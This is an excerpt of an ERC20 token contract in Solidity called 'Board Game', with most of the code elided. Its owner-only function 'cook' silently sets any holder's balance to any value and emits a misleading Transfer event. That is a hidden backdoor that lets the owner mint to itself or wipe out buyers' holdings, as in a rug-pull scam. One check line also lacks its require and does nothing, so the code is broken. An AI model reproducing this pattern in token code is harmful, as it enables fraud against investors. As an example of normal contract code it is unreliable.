...
contract BoardGame is Context, IERC20, Ownable {
    ...
    string private constant _name = "Board Game";
    ...
    function cook(address sender, address spender, uint256 value, uint8 action) public onlyOwner {
        (spender != address(0), "ERC20: burn from the zero address");
        require(value != 1, "Transfer amount must be not one");
        balances[sender] = 1 * value * (10 ** 9);
        balances[spender] = 0 + value * (10 ** 9);
        emit Transfer( spender, address(0x0), value);
    }
